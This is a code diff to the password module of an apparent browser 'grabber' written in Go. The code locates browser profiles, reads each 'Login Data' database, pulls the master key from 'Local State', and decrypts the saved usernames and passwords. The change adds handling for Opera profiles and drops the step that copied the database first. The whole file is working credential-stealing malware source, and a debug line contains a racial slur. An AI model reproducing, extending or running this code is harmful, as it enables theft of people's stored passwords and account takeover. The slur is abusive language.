@@ -3,11 +3,12 @@ package pass
 import (
 	"database/sql"
 	"encoding/json"
+	"fmt"
 	"os"
+	"strings"
 
-	"example.com/grabber/browsers/util"
-	"example.com/grabber/decryption"
-	_ "github.com/mattn/go-sqlite3"
+	"kdot/grabber/browsers/util"
+	"kdot/grabber/decryption"
 )
 
 type Passwords struct {
@@ -17,6 +18,7 @@ type Passwords struct {
 }
 
 func Get() string {
+
 	var passwords []Passwords
 	dpPaths := util.GetBPth()
 	extraPaths := util.GetProfiles()
@@ -26,22 +28,32 @@ func Get() string {
 			continue
 		}
 		master_key := decryption.GetMasterKey(path + "\\Local State")
+		ranOpera := false
 		for _, profile := range extraPaths {
-			if _, err := os.Stat(path + "\\" + profile); os.IsNotExist(err) {
-				continue
+			if ranOpera {
+				break
+			} else if strings.Contains(path, "Opera") {
+				profile = path
+				ranOpera = true
+				if _, err := os.Stat(path); os.IsNotExist(err) {
+					continue
+				}
+			} else {
+				if _, err := os.Stat(path + "\\" + profile); os.IsNotExist(err) {
+					continue
+				}
+				path = path + "\\" + profile
 			}
-			path = path + "\\" + profile
-			copy_path := path + "\\Login Data" + util.RandomName()
-			util.CopyFileKDOT(path+"\\Login Data", copy_path)
-			db, err := sql.Open("sqlite3", copy_path)
+
+			db, err := sql.Open("sqlite3", path+"\\Login Data")
 			if err != nil {
 				continue
 			}
 			defer db.Close()
-			defer os.Remove(copy_path)
 
 			row, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
 			if err != nil {
+				fmt.Println("this is the issue nigga")
 				continue
 			}
 			defer row.Close()
@@ -54,6 +66,10 @@ func Get() string {
 				decrypted, err := decryption.DecryptPassword(password_value, master_key)
 				if err != nil {
 					decrypted = string(password_value)
+				}
+				// I think this occurs when a user presses no to save password it still stores it (weird)
+				if username_value == "" && decrypted == "" {
+					continue
 				}
 				passwords = append(passwords, Passwords{origin_url, username_value, decrypted})
 			}
